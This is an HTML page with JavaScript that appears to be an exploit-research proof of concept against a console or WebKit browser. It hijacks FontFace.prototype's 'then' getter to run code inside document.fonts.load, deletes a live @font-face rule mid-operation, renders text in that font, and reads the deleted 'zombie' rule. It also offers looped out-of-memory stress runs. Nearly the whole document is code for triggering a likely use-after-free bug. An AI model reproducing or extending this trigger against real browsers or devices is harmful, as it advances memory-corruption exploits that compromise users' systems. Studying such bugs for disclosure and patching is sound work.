<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Phase 3 — Render B inside trigger (14)</title>
<style>
body { font-family: monospace; background: #111; color: #0f0; padding: 12px; margin: 0; }
#status { font-size: 16px; margin-bottom: 6px; color: #ff0; }
#summary { color: #aaa; font-size: 12px; margin-bottom: 8px; line-height: 1.5; }
#log { height: 68vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 11px; }
.ok { color: #0f0; } .bad { color: #f66; } .weird { color: #ff6; }
#t { font-family: x; font-size: 96px; color: #fff; line-height: 1; }
</style>
<style id="s">
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body>
<div id="status">running...</div>
<div id="summary">Default: 1 cycle, manual off. Use ?loops=8 or ?stress=1 for OOM stress. Quit browser between sessions.</div>
<div id="controls" style="display:none;margin-bottom:8px;">
<button id="runOnce" style="font-size:14px;padding:8px 16px;">Run 1 cycle</button>
<button id="runStress" style="font-size:14px;padding:8px 16px;margin-left:8px;">Run stress (loops)</button>
</div>
<div id="log"></div>
<div id="t">.</div>
<script>
(function () {
    var logEl = document.getElementById('log');
    window.ps4log = function (msg, cls) {
        var line = document.createElement('div');
        line.textContent = '[' + performance.now().toFixed(1) + 'ms] ' + msg;
        if (cls) line.className = cls;
        logEl.appendChild(line);
    };
    window.ps4status = function (t, c) {
        document.getElementById('status').textContent = t;
        if (c) document.getElementById('status').style.color = c;
    };
})();

var v = { p: 0, f: 0, w: 0, lines: [] };
function pass(m) { v.p++; v.lines.push('✓ ' + m); ps4log('✓ SUCCESS: ' + m, 'ok'); }
function fail(m) { v.f++; v.lines.push('✗ ' + m); ps4log('✗ FAILED: ' + m, 'bad'); }
function weird(m) { v.w++; v.lines.push('! ' + m); ps4log('! WEIRD: ' + m, 'weird'); }

var params = new URLSearchParams(location.search);
var LOOPS = 1;
if (params.has('loops')) LOOPS = Math.max(0, parseInt(params.get('loops'), 10) || 1);
if (params.get('stress') === '1') LOOPS = Math.max(LOOPS, 8);
var MANUAL = params.get('manual') === '1' || params.get('autorun') === '0';
var SKIP_RENDER = params.get('render') === '0';
var LIGHT = params.get('light') !== '0';

function renderB(label) {
    if (SKIP_RENDER) {
        ps4log(label + ' render skipped (?render=0)');
        return 0;
    }
    var el = document.getElementById('t');
    el.textContent = 'B';
    el.style.fontFamily = 'x, sans-serif';
    el.style.fontSize = LIGHT ? '24px' : '96px';
    var w = el.offsetWidth;
    var h = el.offsetHeight;
    ps4log(label + ' render B offset=' + w + 'x' + h);
    document.body.offsetTop;
    document.documentElement.offsetTop;
    return w;
}

function cleanupFace(A) {
    try {
        if (A && document.fonts.has(A)) document.fonts.delete(A);
    } catch (e) {
        ps4log('fonts.delete(A): ' + e);
    }
}

function runCycles(maxCycle) {
    var sheet = document.getElementById('s').sheet;
    var staleRule = sheet.cssRules[0];

    for (var cycle = 1; cycle <= maxCycle; cycle++) {
        ps4log('--- cycle ' + cycle + ' ---');

        if (cycle > 1) {
            sheet.insertRule(
                "@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }",
                0
            );
        }

        var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        document.fonts.add(A);
        void A.loaded;

        var fired = false;
        var renderInTrigger = false;

        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get: function () {
                if (!fired && this === A) {
                    fired = true;
                    ps4log('cycle ' + cycle + ' TRIGGER');

                    if (!LIGHT) {
                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                    }

                    if (sheet.cssRules.length > 0) sheet.deleteRule(0);

                    var cb = document.fonts.check('1em x', 'B');
                    ps4log('cycle ' + cycle + ' check(B) inside trigger=' + cb);
                    if (cb) weird('cycle ' + cycle + ' check(B)=true inside trigger (after delete)');

                    renderInTrigger = true;
                    renderB('cycle ' + cycle + ' inside trigger');

                    try {
                        staleRule.cssText;
                        pass('cycle ' + cycle + ' READ zombie inside trigger');
                    } catch (e) {
                        fail('cycle ' + cycle + ' zombie read threw in trigger');
                    }
                }
                return undefined;
            }
        });

        document.fonts.load('1em x', 'AB');

        if (!fired) fail('cycle ' + cycle + ' trigger never fired');
        else pass('cycle ' + cycle + ' trigger fired');
        if (renderInTrigger) pass('cycle ' + cycle + ' render inside trigger');

        cleanupFace(A);
    }

    ps4log('--- after all cycles ---');
    ps4log('fonts.size=' + document.fonts.size);
    var finalCheck = document.fonts.check('1em x', 'B');
    ps4log('final check(B)=' + finalCheck);
    if (finalCheck) weird('final check(B)=true');
    else pass('final check(B)=false');

    renderB('final outside trigger');

    document.fonts.load('1em x', 'B').then(function (faces) {
        ps4log('final load(B) count=' + faces.length);
        if (finalCheck && faces.length === 0) pass('final check/load mismatch');
        if (faces.length > 0) pass('final load(B) returned faces');
    }).catch(function (e) {
        ps4log('final load(B): ' + e);
        if (finalCheck) weird('final check(B) true but load(B) errored');
    });

    setTimeout(function () {
        ps4log('========== SUMMARY ==========');
        for (var i = 0; i < v.lines.length; i++) ps4log(v.lines[i]);
        ps4log('Passed: ' + v.p + ' Failed: ' + v.f + ' Weird: ' + v.w);
        ps4log('fonts.size=' + document.fonts.size + ' (lower = less leak this session)');
        ps4status('done weird=' + v.w, '#0f0');
    }, 1500);
}

window.onload = function () {
    ps4log('Phase 3n — render B inside trigger (14)');
    ps4log('loops=' + LOOPS + ' light=' + LIGHT + ' manual=' + MANUAL + ' render=' + (SKIP_RENDER ? 'off' : 'on'));
    ps4log('UA: ' + navigator.userAgent);
    ps4log('OOM stress: ?loops=8 or ?stress=1 — safe observe: default or ?loops=1&manual=1');
    ps4log('');

    var sheet = document.getElementById('s').sheet;
    pass('held stale ref from first @font-face');

    if (MANUAL) {
        document.getElementById('controls').style.display = 'block';
        ps4status('ready — tap Run (no auto stress)', '#ff0');
        document.getElementById('runOnce').onclick = function () {
            v.p = 0; v.f = 0; v.w = 0; v.lines = [];
            document.getElementById('log').innerHTML = '';
            ps4status('running 1 cycle...', '#ff0');
            runCycles(1);
        };
        document.getElementById('runStress').onclick = function () {
            v.p = 0; v.f = 0; v.w = 0; v.lines = [];
            document.getElementById('log').innerHTML = '';
            ps4status('running ' + LOOPS + ' cycles...', '#ff0');
            runCycles(LOOPS);
        };
        return;
    }

    if (LOOPS < 1) {
        ps4status('idle — set ?loops=1 or use manual=1', '#ff0');
        return;
    }

    runCycles(LOOPS);
};
</script>
</body>
</html>
